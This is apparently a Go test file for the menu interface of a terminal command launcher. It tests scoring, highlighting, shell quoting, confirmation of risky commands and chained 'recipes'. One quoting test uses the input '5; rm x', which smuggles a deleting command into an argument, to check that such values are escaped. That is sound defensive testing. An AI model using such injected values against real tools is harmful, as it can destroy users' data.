package ui

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"
	"github.com/con-dog/clingon/internal/config"
	"github.com/con-dog/clingon/internal/tmpl"
)

func TestScoreRanksSubstringAboveSubsequence(t *testing.T) {
	if score("del", "delete files") <= score("del", "docker exec login") {
		t.Fatal("substring should beat subsequence")
	}
	if score("xyz", "delete") != 0 {
		t.Fatal("non-match should score 0")
	}
	if score("go fold", "go to folder") == 0 {
		t.Fatal("words in order should match")
	}
}

func TestBurstIsTextNotAKeyName(t *testing.T) {
	burst := typed("delete")
	if keyName(burst) != "" {
		t.Fatal("a burst of typed text must not match the Delete key")
	}
	if keyName(tea.KeyPressMsg{Code: tea.KeyEnter}) != "enter" {
		t.Fatal("real keys keep their names")
	}
}

func TestDescribeExtendsPerArg(t *testing.T) {
	c := &config.Command{Desc: "Deletes files.", Risk: config.RiskWarn, Args: []config.Arg{
		{Name: "pattern", Desc: "Files named <pattern>."},
		{Name: "dir", Desc: "Under <dir>."},
		{Name: "flags", Type: "flags"},
	}}
	got := describe(c, map[string]string{"pattern": "*.log"}, map[string]string{}, 1, ".", "")
	if got != "Deletes files. Files named *.log. Under this folder. ⚠ Asks before running." {
		t.Fatalf("got %q", got)
	}
	got = describe(c, map[string]string{"pattern": "x", "dir": "src", "flags": "-i -w"}, map[string]string{"flags": "ignore case, whole words"}, 3, "", "")
	if got != "Deletes files. Files named x. Under src. Ignore case, whole words. ⚠ Asks before running." {
		t.Fatalf("got %q", got)
	}
}

func TestHighlightTokens(t *testing.T) {
	// Compare the plain text, and check which words got which style.
	cmd := `sudo apt update && du -h -d 1 . 2>/dev/null | sort -rh; grep -rn -- 'a b' "c"`
	if got := ansi.Strip(highlight(cmd)); got != cmd {
		t.Fatalf("highlighting changed the text: %q", got)
	}
	h := highlight(cmd)
	for _, want := range []string{
		hlProgram.Render("sudo"), hlProgram.Render("apt"), hlProgram.Render("du"), hlProgram.Render("sort"), hlProgram.Render("grep"),
		hlFlag.Render("-rh"), hlFlag.Render("--"), hlOperator.Render("&&"), hlOperator.Render("|"), hlOperator.Render(">"),
		hlString.Render("'a b'"),
	} {
		if !strings.Contains(h, want) {
			t.Errorf("missing %q", want)
		}
	}
	if strings.Contains(h, hlProgram.Render("update")) || strings.Contains(h, hlProgram.Render("/dev/null")) {
		t.Error("arguments styled as programs")
	}
}

func TestShellQuote(t *testing.T) {
	for in, want := range map[string]string{"mine": "mine", "My tools": "'My tools'", "find . -name '*.go'": `'find . -name '\''*.go'\'''`, "a/b.c:1": "a/b.c:1"} {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

func TestRiskyCommandScreen(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Delete", Cmd: "rm <file>", Risk: config.RiskWarn, Args: []config.Arg{{Name: "file"}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	key := func(k tea.KeyPressMsg) { m.Update(k) }
	enter, down := tea.KeyPressMsg{Code: tea.KeyEnter}, tea.KeyPressMsg{Code: tea.KeyDown}
	m.showSection(&m.opt.Config.Sections[0])

	key(enter) // open the command
	key(typed("a.txt"))
	key(enter) // last arg: on to the risky screen
	if m.mode != modeConfirm || m.yes {
		t.Fatalf("want the risky screen with No highlighted, mode %v yes %v", m.mode, m.yes)
	}
	key(enter) // Enter on "No, go back"
	if m.mode != modeFill || m.job.input.Value() != "a.txt" || len(sent) != 0 {
		t.Fatalf("No should go back to the answer, kept: mode %v value %q sent %v", m.mode, m.job.input.Value(), sent)
	}
	key(enter)
	key(down)  // highlight "Yes, run it"
	key(enter) // run
	if len(sent) != 1 || sent[0] != "rm a.txt" {
		t.Fatalf("got %v", sent)
	}
}

func TestValuesAreQuotedWhereTheArgSays(t *testing.T) {
	c := &config.Command{Cmd: "cd <dir> && git switch <b> && echo <raw>", Args: []config.Arg{
		{Name: "dir", Quote: true}, {Name: "b", Quote: true}, {Name: "raw"},
	}}
	got := tmpl.Render(c.Cmd, c.Known, shellValues(c, map[string]string{"dir": "My Docs", "b": "~", "raw": "a b"}))
	if got != "cd 'My Docs' && git switch ~ && echo a b" { // a typed ~ is your home
		t.Fatalf("got %s", got)
	}
	// A value typed into a fixed list instead of picked is quoted.
	c = &config.Command{Cmd: "head -n <n>", Args: []config.Arg{{Name: "n", Options: []config.Option{{Value: "10"}}}}}
	if got := tmpl.Render(c.Cmd, c.Known, shellValues(c, map[string]string{"n": "5; rm x"})); got != "head -n '5; rm x'" {
		t.Fatalf("got %s", got)
	}
}

func TestAnOptionalValueCanBeSkipped(t *testing.T) {
	sec := config.Section{Name: "Docker", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Up", Cmd: "docker compose up -d <services>", Args: []config.Arg{{Name: "services", Optional: true}}},
	}}
	var sent []string
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send: func(c string) error { sent = append(sent, c); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 1 || sent[0] != "docker compose up -d" {
		t.Fatalf("got %v", sent)
	}
}

func TestDisabledCommandsDontOpen(t *testing.T) {
	sec := &config.Section{Name: "Packs", Icon: "❏", Category: "Clingon", Commands: []config.Command{
		{Name: "Edit a pack", Cmd: "x <p>", Disabled: "You don't have any local packs yet.", Args: []config.Arg{{Name: "p"}}},
	}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} },
		Send: func(string) error { t.Fatal("nothing should run"); return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(sec)
	if it := m.list.selected(); it == nil || !it.disabled {
		t.Fatal("the cursor lands on a greyed-out command, so it can say why")
	}
	if _, desc := m.details(); !strings.Contains(desc, "Not available: You don't have any local packs yet.") {
		t.Fatalf("the info pane says why, got %q", desc)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.mode != modeBrowse || m.job != nil {
		t.Fatal("a greyed-out command must not open")
	}
}

func TestCursorStartsOnAUsableRow(t *testing.T) {
	sec := &config.Section{Name: "S", Icon: "•", Category: config.Other, Groups: []config.Group{
		{Name: "A", Commands: []config.Command{{Name: "a1", Cmd: "x", Disabled: "no"}, {Name: "a2", Cmd: "x"}, {Name: "a3", Cmd: "x", Disabled: "no"}}},
		{Name: "B", Commands: []config.Command{{Name: "b1", Cmd: "x", Disabled: "no"}, {Name: "b2", Cmd: "x"}}},
	}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(sec)
	at := func() string { return m.list.selected().title }
	if at() != "a2" {
		t.Fatalf("starts on the first usable row, got %q", at())
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if at() != "a3" {
		t.Fatalf("down lands on greyed rows too, so they can say why, got %q", at())
	}
}

func TestShiftJumpsBetweenHeadings(t *testing.T) {
	items := []item{{title: "A", header: true}, {title: "a1"}, {title: "a2"}, {header: true}, {title: "B", header: true}, {title: "b1"}, {title: "b2"}}
	p := newPicker(items, nil, false)
	at := func() string { return p.selected().title }
	p.jump(1)
	if at() != "b1" {
		t.Fatalf("down from a1: %s", at())
	}
	p.jump(1)
	if at() != "b1" {
		t.Fatalf("down from the last heading stays: %s", at())
	}
	p.move(1) // b2
	p.jump(-1)
	if at() != "b1" {
		t.Fatalf("up goes to the top of the current heading first: %s", at())
	}
	p.jump(-1)
	if at() != "a1" {
		t.Fatalf("then to the previous heading: %s", at())
	}
	flat := newPicker([]item{{title: "x"}, {title: "y"}, {title: "z"}}, nil, false)
	flat.jump(1)
	if flat.selected().title != "z" {
		t.Fatal("no headings: jump to the bottom")
	}
}

func TestMenuLocksWhileShellIsBusy(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Edit a pack", Cmd: "micro x"}, {Name: "Other", Cmd: "ls"},
	}}
	var sent []string
	release := make(chan bool)
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
		Send:     func(c string) error { sent = append(sent, c); return nil },
		WaitIdle: func() bool { return <-release }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	_, cmds := m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) // runs "micro x"
	wait := cmds().(tea.BatchMsg)[0]
	if m.busy != "Edit a pack" {
		t.Fatalf("menu should lock while it runs, busy=%q", m.busy)
	}
	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "is running") {
		t.Errorf("a command that's just started shouldn't flash the band, got %q", bar)
	}
	m.Update(busyGraceMsg{})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // browsing still works, as usual
	if it := m.list.selected(); it == nil || it.title != "Other" || it.disabled {
		t.Fatalf("rows stay as they are while it runs: only running waits, got %+v", it)
	}
	if cmd, _ := m.details(); !strings.Contains(ansi.Strip(cmd), "ls") {
		t.Errorf("the Command area still shows what it would run, got %q", cmd)
	}
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "⏳ Edit a pack is running") {
		t.Errorf("the status bar should say so, got %q", bar)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape}) // back to the top
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape}) // and quitting would end micro: refused
	if len(sent) != 1 || m.Quit {
		t.Fatalf("nothing runs, and no quitting, while locked: sent %v quit %v", sent, m.Quit)
	}
	go func() { release <- true }()
	m.Update(wait()) // micro exits
	if m.busy != "" {
		t.Fatal("menu should unlock when the shell is back at its prompt")
	}
	m.showSection(&m.opt.Config.Sections[0]) // the Escs above went back to the top
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if len(sent) != 2 || sent[1] != "ls" {
		t.Fatalf("unlocked: commands run again, got %v", sent)
	}
}

// The bar's warning clears by itself: focus may never come back to prompt it.
func TestShellWarningClearsWithoutFocus(t *testing.T) {
	shell := ShellState{Typed: unfinishedCommand}
	m := New(Options{Config: &config.Config{}, Send: func(string) error { return nil },
		Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})

	_, look := m.Update(idleMsg{seq: -1})
	if look == nil {
		t.Fatal("a warning should keep the shell being looked at")
	}
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "middle of a command") {
		t.Fatalf("the bar should warn, got %q", bar)
	}
	if _, again := m.Update(tea.BlurMsg{}); again != nil {
		t.Fatal("one look at a time")
	}

	m.Update(shellLookMsg{}) // still there: goes on looking
	if !m.looking {
		t.Fatal("still unfinished: it should look again")
	}
	shell = ShellState{}
	if _, cmd := m.Update(shellLookMsg{}); cmd != nil || m.looking {
		t.Fatal("nothing to warn of: it should stop looking")
	}
	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "middle of a command") {
		t.Fatalf("the warning should be gone, got %q", bar)
	}

	// What it was warning about turned into a running command.
	m.typed, shell = "sleep 9", ShellState{Busy: "sleep"}
	m.Update(shellLookMsg{})
	if m.busy != "sleep" || !m.waiting {
		t.Fatalf("it should wait for what's running, busy=%q waiting=%v", m.busy, m.waiting)
	}

	// A command from the menu is running: a look can't unlock it early.
	m.busy, m.typed, shell = "Edit a pack", "", ShellState{}
	m.Update(shellLookMsg{})
	if m.busy != "Edit a pack" {
		t.Fatalf("the wait for it says when it's done, busy=%q", m.busy)
	}

	// The question on screen keeps what it asked about.
	m.busy, m.mode, m.typed = "", modeTyped, "git sta"
	m.Update(shellLookMsg{})
	if m.typed != "git sta" {
		t.Fatalf("typed changed under the question: %q", m.typed)
	}
}

func TestNumberKeysNumberCommands(t *testing.T) {
	cfg := func() *config.Config {
		return &config.Config{Sections: []config.Section{
			{Name: "AWS", Icon: "•", Category: config.Other, Commands: []config.Command{
				{Name: "List s3 buckets", Cmd: "aws s3 ls"},
				{Name: "A name far too long to fit in the width of the panel", Cmd: "x"},
				{Name: "Who am I", Cmd: "aws sts get-caller-identity"},
			}},
			{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}},
		}}
	}
	current := cfg()
	m := New(Options{Config: current, Send: func(string) error { return nil }, Reload: func() (*config.Config, error) { current = cfg(); return current, nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	press := func(s string) { m.Update(typed(s)) }
	down := func() { m.Update(tea.KeyPressMsg{Code: tea.KeyDown}) }
	const width = 30
	rowOf := func(title string) string {
		t.Helper()
		for _, it := range m.list.view {
			if strings.HasPrefix(it.title, title) {
				return ansi.Strip(m.list.row(it, false, width))
			}
		}
		t.Fatalf("no row %q", title)
		return ""
	}
	// endsIn checks the number's badge is in its column, a cell off the frame.
	endsIn := func(title, n string) {
		t.Helper()
		row := rowOf(title)
		if n == "" {
			if last := strings.TrimRight(row, " "); strings.ContainsAny(last[len(last)-1:], "123456789") {
				t.Errorf("%q should have no number: %q", title, row)
			}
			return
		}
		if ansi.StringWidth(row) != width || !strings.HasSuffix(row, " "+n+"  ") {
			t.Errorf("%q should end in a badge for %s at cell %d: %q", title, n, width, row)
		}
	}

	m.showSection(&m.opt.Config.Sections[0])
	press("1")
	down()
	down()
	press("2")
	endsIn("List s3", "1")
	endsIn("Who am I", "2")
	endsIn("A name far", "")
	if m.list.query() != "" {
		t.Fatalf("numbering shouldn't reach the filter, got %q", m.list.query())
	}

	// A long name is cut short of the column, with or without a number.
	m.list.move(-1)
	before := rowOf("A name far")
	press("3")
	endsIn("A name far", "3")
	if got := strings.TrimRight(rowOf("A name far"), " 3"); got != strings.TrimRight(before, " ") {
		t.Errorf("a number shouldn't change where a name is cut: %q, then %q", before, got)
	}
	press("3") // the same number again takes it off
	endsIn("A name far", "")

	press("1") // a step holds one command, and the chain ends there
	endsIn("A name far", "1")
	endsIn("List s3", "")
	endsIn("Who am I", "")
	press("2") // no step 1 without it: nothing changes
	endsIn("A name far", "1")

	// Numbers carry across sections, into search, and through a reload.
	m.showSection(&m.opt.Config.Sections[1])
	press("2")
	endsIn("Status", "2")
	if !m.reload() {
		t.Fatal("expected a reload")
	}
	endsIn("Status", "2")
	m.showRoot("")
	press("/")
	press("s")
	press("t")
	press("a")
	endsIn("Status", "2")
}

func TestNumberingEndsTheChainThere(t *testing.T) {
	var cmds []config.Command
	for _, name := range strings.Split("a b c d e f g h i j", " ") {
		cmds = append(cmds, config.Command{Name: name, Cmd: name})
	}
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "S", Icon: "•", Category: config.Other, Commands: cmds},
	}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	on := func(name, key string) {
		t.Helper()
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
			}
		}
		m.Update(typed(key))
	}
	chain := func(want string) {
		t.Helper()
		var got []string
		for i, s := range m.recipe {
			got = append(got, fmt.Sprintf("%d%s", i+1, s.ref.cmd.Name))
		}
		if g := strings.Join(got, " "); g != want {
			t.Errorf("got %q, want %q", g, want)
		}
	}
	on("a", "5") // nothing yet: it has to start at 1
	chain("")
	if !strings.Contains(m.hint, "up to step 1") {
		t.Errorf("a refused number should say why, got %q", m.hint)
	}
	for i, name := range strings.Split("a b c d e f g h i", " ") {
		on(name, fmt.Sprint(i+1))
	}
	if m.hint != "" {
		t.Errorf("the next key should clear the hint, got %q", m.hint)
	}
	chain("1a 2b 3c 4d 5e 6f 7g 8h 9i")

	on("j", "9") // the last step: nothing after it to clear
	chain("1a 2b 3c 4d 5e 6f 7g 8h 9j")
	on("j", "2") // a new command at 2: it takes 2 and ends the chain
	chain("1a 2j")
	on("c", "5") // past the next free step: refused
	chain("1a 2j")
	on("c", "3")
	chain("1a 2j 3c")
	on("j", "2") // its own number: only that step goes, the rest close up
	chain("1a 2c")
	on("a", "1")
	chain("1c")
	on("c", "2") // it would leave step 1 empty: refused
	chain("1c")
	if !strings.Contains(m.hint, "up to step 1") {
		t.Errorf("it can only be step 1, got %q", m.hint)
	}

	on("d", "2")
	on("e", "3")
	on("c", "2") // moving down: it leaves its step, the rest close up, then it ends the chain
	chain("1d 2c")
	on("e", "3")
	on("e", "1") // moving up: the same
	chain("1e")
}

// The filter opens with /, so letters and digits have a job only once it has.
func TestSlashOpensTheFilter(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{
		{Name: "AWS", Icon: "•", Category: config.Other, Commands: []config.Command{
			{Name: "ec2 list", Cmd: "aws ec2"}, {Name: "s3 list", Cmd: "aws s3"},
		}},
	}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	press := func(s string) { t.Helper(); m.Update(typed(s)) }
	key := func(code rune) { t.Helper(); m.Update(tea.KeyPressMsg{Code: code}) }
	queryIs := func(want string) {
		t.Helper()
		if got := m.list.filter.Value(); got != want {
			t.Errorf("filter = %q, want %q", got, want)
		}
	}

	// Not filtering: text goes nowhere, and a digit on a section does nothing.
	for _, k := range []string{"e", "4", "ec2"} {
		press(k)
		queryIs("")
		if m.hint != "Press / to filter" {
			t.Errorf("%q should say how to filter, got %q", k, m.hint)
		}
	}
	if view := ansi.Strip(m.browseView(60, 10)); !strings.Contains(view, "❯ / to filter") {
		t.Errorf("the filter's line should say how to open it:\n%s", view)
	}

	// / opens it, without typing itself. Digits are search, not steps.
	press("/")
	queryIs("")
	if m.hint != "" {
		t.Errorf("hint should clear, got %q", m.hint)
	}
	if view := ansi.Strip(m.browseView(60, 10)); !strings.Contains(view, "type to filter") {
		t.Errorf("an open filter is an input:\n%s", view)
	}
	press("e")
	press("c")
	press("2")
	queryIs("ec2")
	if it := m.list.selected(); it == nil || it.title != "ec2 list" {
		t.Fatalf("it should search every command, at %+v", it)
	}
	if len(m.recipe) != 0 {
		t.Fatalf("no numbering while filtering, got %v", m.recipe)
	}
	press("?") // text, while it's open
	queryIs("ec2?")
	if m.help {
		t.Error("? is text while filtering")
	}

	// / again closes it, clearing what's typed. It only does that as a key of
	// its own: in pasted text it's part of the search.
	press("/")
	queryIs("")
	if m.list.filtering {
		t.Error("a second / should stop filtering")
	}
	press("/")
	m.Update(tea.PasteMsg{Content: "a/b"})
	queryIs("a/b")
	if !m.list.filtering {
		t.Error("a / in pasted text shouldn't stop filtering")
	}
	press("/")
	if m.list.filtering || m.section != nil {
		t.Errorf("/ should only stop filtering: filtering %v, section %v", m.list.filtering, m.section)
	}
	press("/")
	press("ec2")

	// esc clears it and stops filtering, in one: digits are back to normal.
	key(tea.KeyEscape)
	queryIs("")
	if m.list.filtering {
		t.Error("esc should stop filtering")
	}
	if m.Quit {
		t.Fatal("that esc shouldn't quit")
	}

	// In a section too: opened with nothing typed, esc just closes it.
	m.showSection(&m.opt.Config.Sections[0])
	press("/")
	key(tea.KeyEscape)
	if m.list.filtering || m.section == nil {
		t.Fatalf("esc should only close the filter: filtering %v, section %v", m.list.filtering, m.section)
	}
	press("1")
	if len(m.recipe) != 1 {
		t.Fatalf("out of the filter, a digit numbers: %v", m.recipe)
	}
	press("/")
	press("2") // in the filter, it doesn't
	queryIs("2")
	if len(m.recipe) != 1 {
		t.Fatalf("in the filter, a digit is search: %v", m.recipe)
	}
	m.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl}) // ctrl-c stops filtering too
	if m.list.filtering || m.section == nil {
		t.Fatalf("ctrl-c should only stop filtering: filtering %v", m.list.filtering)
	}

	// ← leaves the filter behind too.
	m.showRoot("")
	press("/")
	press("aws")
	key(tea.KeyLeft)
	if m.list.filtering {
		t.Error("← should stop filtering at the top")
	}

	// Fast typing can bring the / and what's after it in one message.
	press("/ec2")
	queryIs("ec2")
	if !m.list.filtering {
		t.Error("the burst should open the filter")
	}
	m.list.clearFilter()

	// Pasted text does what typing would.
	m.Update(tea.PasteMsg{Content: "ec2"})
	queryIs("")
	m.Update(tea.PasteMsg{Content: "/ec2"})
	queryIs("ec2")
	m.list.clearFilter()

	// [ ] still jump, and the arrows still move, without a filter.
	press("]")
	key(tea.KeyDown)
	queryIs("")

	// A reload (coming back to the menu) keeps it open.
	m.opt.Reload = func() (*config.Config, error) { return m.opt.Config, nil }
	press("/")
	press("ec")
	if !m.reload() || !m.list.filtering {
		t.Errorf("a reload should keep the filter open: %v", m.list.filtering)
	}
	queryIs("ec")
}

// A section can have a heading and nothing under it yet: every key still has
// to behave there.
func TestEmptySectionIsSafe(t *testing.T) {
	sec := &config.Section{Name: "Recipes", Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}
	m := New(Options{Config: &config.Config{}, Builtin: func() []*config.Section { return []*config.Section{sec} }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	if it := m.list.selected(); it == nil || it.title != "Recipes" {
		t.Fatalf("it should be listed, at %+v", it)
	}
	_ = m.view()
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.section != sec {
		t.Fatal("it should open")
	}
	for _, k := range []tea.KeyPressMsg{
		{Code: tea.KeyDown}, {Code: tea.KeyUp}, {Code: tea.KeyPgDown}, {Code: tea.KeyEnter}, {Code: tea.KeyRight},
		typed("]"), typed("["), typed("1"), typed("x"), typed("/"), typed("a"), typed("/"),
	} {
		m.Update(k)
		if view := ansi.Strip(m.view()); !strings.Contains(view, "CURRENT RECIPE") && m.list.query() == "" {
			t.Errorf("after %q the heading should still show:\n%s", k.String(), view)
		}
	}
	if len(m.recipe) != 0 || m.section != sec || m.mode != modeBrowse {
		t.Fatalf("nothing there to act on: recipe %v, mode %v", m.recipe, m.mode)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	if m.section != nil {
		t.Fatal("← should go back")
	}
}

func TestCurrentRecipeListsTheSteps(t *testing.T) {
	cfg := func(names ...string) *config.Config {
		var cmds []config.Command
		for _, n := range names {
			cmds = append(cmds, config.Command{Name: n, Cmd: "run " + n})
		}
		return &config.Config{Sections: []config.Section{{Name: "AWS", Icon: "•", Category: config.Other, Commands: cmds}}}
	}
	next := cfg("a", "b", "c")
	var sent []string
	m := New(Options{Config: cfg("a", "b", "c"), Reload: func() (*config.Config, error) { return next, nil },
		Send: func(c string) error { sent = append(sent, c); return nil },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	press := func(s string) { t.Helper(); m.Update(typed(s)) }
	rows := func() string {
		var got []string
		for _, it := range m.list.view {
			if !it.header {
				got = append(got, fmt.Sprintf("%d%s", m.itemStep(it), it.title))
			}
		}
		return strings.Join(got, " ")
	}

	// Nothing yet: r still goes there, and says how to start.
	press("r")
	if m.section != m.recipesSection() || rows() != "" {
		t.Fatalf("r should open the empty recipe: section %v, rows %q", m.section, rows())
	}
	if !strings.Contains(m.hint, "press 1-9") {
		t.Errorf("an empty recipe should say how to start, got %q", m.hint)
	}

	// Numbered elsewhere, listed here in order, from any list.
	m.showSection(&m.opt.Config.Sections[0])
	press("1") // a
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	press("2") // c
	m.Update(tea.KeyPressMsg{Code: tea.KeyUp})
	press("3") // b
	if bar := ansi.Strip(m.statusBar(80)); !strings.HasPrefix(strings.TrimSpace(bar), "r recipe  1  a") {
		t.Errorf("the bar should offer the key, got %q", bar)
	}
	press("r")
	if rows() != "0Run recipe 1a 2c 3b" {
		t.Fatalf("rows = %q", rows())
	}
	if it := m.list.selected(); it == nil || it.title != "Run recipe" {
		t.Errorf("r should land on Run recipe, at %+v", it)
	}
	if row := ansi.Strip(m.list.row(m.list.view[2], false, 30)); !strings.HasPrefix(row, "    a · AWS") {
		t.Errorf("the steps should sit indented under it: %q", row)
	}
	if view := ansi.Strip(m.view()); !strings.Contains(view, "CURRENT RECIPE") || !strings.Contains(view, "a · AWS") {
		t.Errorf("the rows should say where they're from:\n%s", view)
	}

	// The numbers work here too, and the list keeps up.
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	press("2") // c's own number: it goes, and the cursor stays in place
	if rows() != "0Run recipe 1a 2b" {
		t.Fatalf("rows = %q", rows())
	}
	if it := m.list.selected(); it == nil || it.title != "b" {
		t.Errorf("the cursor should stay put, at %+v", it)
	}
	press("3") // past what's left: refused
	if rows() != "0Run recipe 1a 2b" {
		t.Fatalf("rows = %q", rows())
	}

	// At the top, the row says what's in it before it's opened.
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	if it := m.list.selected(); it == nil || it.title != RecipesSection {
		t.Fatalf("← should land on its row, at %+v", it)
	}
	if view := ansi.Strip(m.view()); !strings.Contains(view, "2 COMMANDS") || !strings.Contains(view, "Current recipe: a, b") {
		t.Errorf("the info pane should list the steps:\n%s", view)
	}

	// A command that's gone leaves the recipe, and what it still runs is new.
	next = cfg("b", "z")
	next.Sections[0].Commands[0].Desc = "reloaded"
	if !m.reload() {
		t.Fatal("expected a reload")
	}
	if len(m.recipe) != 1 || m.recipe[0].ref.cmd.Name != "b" || m.recipe[0].ref.cmd.Desc != "reloaded" {
		t.Fatalf("recipe after reload = %+v", m.recipe)
	}

	// r is text in a filter, and does nothing where the section isn't shown.
	m.showRoot("")
	press("/")
	press("r")
	if m.list.query() != "r" || m.section != nil {
		t.Errorf("r should filter: query %q, section %v", m.list.query(), m.section)
	}
	plain := New(Options{Config: cfg("a")})
	plain.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	plain.Update(typed("r"))
	if plain.section != nil || plain.hint != "Press / to filter" {
		t.Errorf("no section to go to: section %v, hint %q", plain.section, plain.hint)
	}
}

func TestRunningARecipe(t *testing.T) {
	cmds := []config.Command{
		{Name: "ask", Cmd: "ask <what>", Args: []config.Arg{{Name: "what"}}},
		{Name: "bad", Cmd: "bad"},
		{Name: "one", Cmd: "one"},
		{Name: "other", Cmd: "other"},
		{Name: "risky", Cmd: "risky", Risk: config.RiskWarn},
		{Name: "two", Cmd: "two"},
	}
	var sent []string
	failed := false
	shell := ShellState{}
	m := New(Options{
		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
		LastFailed: func() bool { return failed }, Shell: func() ShellState { return shell },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	on := func(name string) {
		t.Helper()
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
				return
			}
		}
		t.Fatalf("no row %q", name)
	}
	build := func(names ...string) {
		t.Helper()
		m.Update(typed("x"))
		m.showSection(&m.opt.Config.Sections[0])
		for i, name := range names {
			on(name)
			m.Update(typed(fmt.Sprint(i + 1)))
		}
		sent, m.errMsg, m.hint = nil, "", ""
	}
	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
	start := func() { t.Helper(); m.Update(typed("r")); right() }
	done := func(ok bool) { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: ok}) }
	sentIs := func(want string) {
		t.Helper()
		if got := strings.Join(sent, " "); got != want {
			t.Errorf("sent %q, want %q", got, want)
		}
	}

	// A command runs by itself as usual, numbered or not, and the recipe stays.
	build("one", "two")
	for _, name := range []string{"other", "two"} {
		on(name)
		right()
		m.Update(idleMsg{seq: m.runSeq, ok: true})
		m.showSection(&m.opt.Config.Sections[0])
	}
	sentIs("other two")
	m.Update(typed("r"))
	on("one") // in the recipe's own list too
	right()
	m.Update(idleMsg{seq: m.runSeq, ok: true})
	sentIs("other two one")
	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("running one shouldn't touch the recipe: run %+v, recipe %v", m.run, m.recipe)
	}
	sent = nil

	// r lands on Run recipe, so r then → runs the chain, one step at a time.
	m.Update(typed("r"))
	if m.details(); m.list.selected().title != "Run recipe" {
		t.Fatalf("r should land on Run recipe, at %+v", m.list.selected())
	}
	if _, desc := m.details(); !strings.Contains(desc, "Runs 2 steps in order") {
		t.Errorf("it should say what it does, got %q", desc)
	}
	right()
	sentIs("one")
	right() // mid-run: locked, with a word on how to stop
	m.Update(typed("1"))
	sentIs("one")
	if len(m.recipe) != 2 {
		t.Fatalf("the steps can't change mid-run: %v", m.recipe)
	}
	m.Update(idleMsg{seq: -1, ok: true}) // some other wait ending says nothing about the step
	sentIs("one")
	done(true)
	sentIs("one two")
	done(true)
	if m.run != nil || len(m.recipe) != 2 {
		t.Fatalf("a finished recipe stays: run %+v, recipe %v", m.run, m.recipe)
	}
	if !strings.Contains(m.hint, "finished: 2 steps") {
		t.Errorf("hint = %q", m.hint)
	}
	start() // and runs again
	done(true)
	done(true)
	sentIs("one two one two")
